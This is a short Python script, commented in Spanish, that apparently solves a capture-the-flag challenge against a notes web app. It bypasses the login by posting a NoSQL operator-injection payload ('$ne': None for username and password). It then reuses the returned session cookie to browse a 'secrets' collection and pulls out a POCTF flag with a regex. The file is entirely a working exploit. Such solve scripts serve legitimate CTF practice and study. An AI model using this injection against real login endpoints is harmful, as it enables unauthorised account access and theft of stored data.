#!/usr/bin/env python3
import re, requests, sys

# Configuración
ENDPOINT    = 'https://pointeroverflowctf.com/challenges/no-structure-required/notes-app/'
COOKIE      = 'session=... cookie de sesion ...'

HEADERS = {"Cookie": COOKIE, "Content-Type": "application/json"}

# Payload
NOSQL_PAYLOAD = {"username": {"$ne": None}, "password": {"$ne": None}}
SECRET_COLLECTION = "secrets"
FLAG_RE = re.compile(r"POCTF\{[^}]+\}")

def main():
    print("PASO 1 - Login con NoSQL Injection")

    r = requests.post(ENDPOINT + "login", json=NOSQL_PAYLOAD, headers=HEADERS)
    if r.status_code != 200:
        print(f"Error en login: {r.status_code}")
        sys.exit(1)
    
    print(f"Login exitoso. Status: {r.status_code}")
    print(f"Response: {r.text}")

    print("\nPASO 2 - Obtener cookie de usuario logueado")
    new_cookie = r.headers.get("set-cookie")
    if not new_cookie:
        print("No se recibió nueva cookie de sesión.")
        sys.exit(1)
    
    print(f"New cookie: {new_cookie}")

    print("\nPASO 3 - Acceder a la colección de secretos")
    r = requests.get(ENDPOINT + f"browse?col={SECRET_COLLECTION}", headers={"Cookie": new_cookie, "Content-Type": "application/json"})
    if r.status_code != 200:
        print(f"Error al acceder a la colección de secretos: {r.status_code}")
        sys.exit(1)
    print(f"Acceso exitoso. Status: {r.status_code}")
    print(f"Response: {r.text}")

    print("\nPASO 4 - Extraer la flag")
    match = FLAG_RE.search(r.text)
    if match:
        print(f"Flag encontrada: {match.group(0)}")
    else:
        print("No se encontró la flag en la respuesta.")

if __name__ == "__main__":
    main()
